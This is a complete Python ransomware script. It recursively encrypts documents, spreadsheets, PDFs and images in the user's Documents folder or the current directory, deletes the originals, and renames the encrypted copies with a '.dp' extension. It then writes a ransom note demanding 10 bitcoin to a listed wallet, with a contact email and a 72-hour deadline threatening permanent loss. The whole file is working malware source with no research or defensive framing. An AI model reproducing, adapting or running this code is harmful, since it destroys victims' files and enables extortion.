import os
from cryptography.fernet import Fernet
import glob

# Generate encryption key
def generate_key():
    key = Fernet.generate_key()
    with open("encryption_key.key", "wb") as key_file:
        key_file.write(key)
    return key

# Load the encryption key
def load_key():
    return open("encryption_key.key", "rb").read()

# Encrypt a file
def encrypt_file(file_path, fernet):
    with open(file_path, "rb") as file:
        file_data = file.read()
    encrypted_data = fernet.encrypt(file_data)
    encrypted_file_path = file_path + ".dp"
    with open(encrypted_file_path, "wb") as file:
        file.write(encrypted_data)
    os.remove(file_path)  # Delete the original file

# Find and encrypt target files
def encrypt_files(target_directory):
    # Generate or load key
    if not os.path.exists("encryption_key.key"):
        key = generate_key()
    else:
        key = load_key()
    
    fernet = Fernet(key)
    
    # File extensions to target
    target_extensions = [".txt", ".docx", ".pdf", ".jpg", ".png", ".xlsx"]
    encrypted_count = 0
    
    # Walk through directory
    for root, dirs, files in os.walk(target_directory):
        for file in files:
            file_path = os.path.join(root, file)
            # Check if file has a target extension
            if any(file.endswith(ext) for ext in target_extensions):
                try:
                    encrypt_file(file_path, fernet)
                    encrypted_count += 1
                    print(f"Encrypted: {file_path}.dp")
                except Exception as e:
                    print(f"Failed to encrypt {file_path}: {e}")
    
    return encrypted_count

# Create ransom note
def create_ransom_note():
    ransom_message = """
    !!! YOUR FILES HAVE BEEN ENCRYPTED !!!

    All your important files have been encrypted with a strong encryption algorithm.
    They now have the .dp extension. You cannot access them without the decryption key.

    To recover your files:
    1. Do not attempt to decrypt the files yourself. It will result in permanent data loss.
    2. Send 10btc to the wallet address below:
       BTC Address: bc1qzmt8sucrml50vr0kjh73d3f0w54zsc5gk602m8
    3. After payment, contact us at recoverfiles@dpencrypt.com with proof of payment.
    4. We will send you the decryption tool and key to restore your files.

    Time is limited. If payment is not received within 72 hours, the decryption key will be destroyed.
    Your files will be lost forever.

    Don't play games. Pay now, or lose everything.
    """
    with open("RANSOM_NOTE.txt", "w") as note:
        note.write(ransom_message)

# Main function
def main():
    # Target directory (e.g., user's Documents folder or current directory)
    target_directory = os.path.expanduser("~/Documents")  # Change as needed
    if not os.path.exists(target_directory):
        target_directory = os.getcwd()  # Fallback to current directory
    
    print(f"Targeting directory: {target_directory}")
    encrypted_count = encrypt_files(target_directory)
    print(f"Total files encrypted: {encrypted_count}")
    
    # Create ransom note
    create_ransom_note()
    print("Ransom note created: RANSOM_NOTE.txt")

if __name__ == "__main__":
    main()
